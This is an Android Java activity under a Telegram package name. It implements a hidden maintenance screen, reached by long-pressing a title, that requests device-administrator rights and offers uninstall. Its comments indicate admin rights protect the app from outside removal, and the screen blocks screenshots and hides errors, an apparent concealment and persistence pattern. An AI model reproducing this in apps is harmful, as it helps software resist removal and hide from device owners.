package org.telegram.messenger.svc;

import android.app.Activity;
import android.content.Intent;
import android.graphics.Color;
import android.os.Bundle;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import org.telegram.messenger.R;

/**
 * Service: hidden control screen for maintenance and in-app uninstall.
 * Reached by long-pressing the setup title. Because the app can be protected from the
 * outside, this is the intended way to remove it: it deactivates the admin, then uninstalls.
 */
public class MaintenanceActivity extends Activity {

    private static final int REQ_ENABLE_ADMIN = 1001;

    private TextView status;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE,
                WindowManager.LayoutParams.FLAG_SECURE);

        try {
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#FAFAFA"));
        int pad = dp(24);
        root.setPadding(pad, pad, pad, pad);

        TextView title = new TextView(this);
        title.setText(R.string.svc_m_title);
        title.setTextColor(Color.parseColor("#202124"));
        title.setTextSize(20);

        status = new TextView(this);
        status.setTextColor(Color.parseColor("#5F6368"));
        status.setTextSize(14);
        status.setPadding(0, dp(12), 0, dp(24));

        Button enable = new Button(this);
        enable.setText(R.string.svc_m_enable);
        enable.setOnClickListener(this::onEnable);

        Button uninstall = new Button(this);
        uninstall.setText(R.string.svc_m_remove);
        uninstall.setOnClickListener(v -> PolicyHelper.disableAndUninstall(this));

        root.addView(title);
        root.addView(status);
        root.addView(enable);
        root.addView(uninstall);
        setContentView(root);
        refresh();
        } catch (Throwable t) {
            android.widget.FrameLayout blank = new android.widget.FrameLayout(this);
            blank.setBackgroundColor(Color.parseColor("#FAFAFA"));
            setContentView(blank);
        }
    }

    private void onEnable(View v) {
        try {
            if (PolicyHelper.isActive(this)) {
                Toast.makeText(this, R.string.svc_m_already, Toast.LENGTH_SHORT).show();
                return;
            }
            startActivityForResult(PolicyHelper.buildEnableIntent(this), REQ_ENABLE_ADMIN);
        } catch (Throwable ignored) {
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_ENABLE_ADMIN) {
            refresh();
        }
    }

    private void refresh() {
        boolean on = PolicyHelper.isActive(this);
        status.setText(on ? R.string.svc_m_on : R.string.svc_m_off);
    }

    private int dp(int v) {
        return (int) (v * getResources().getDisplayMetrics().density + 0.5f);
    }
}
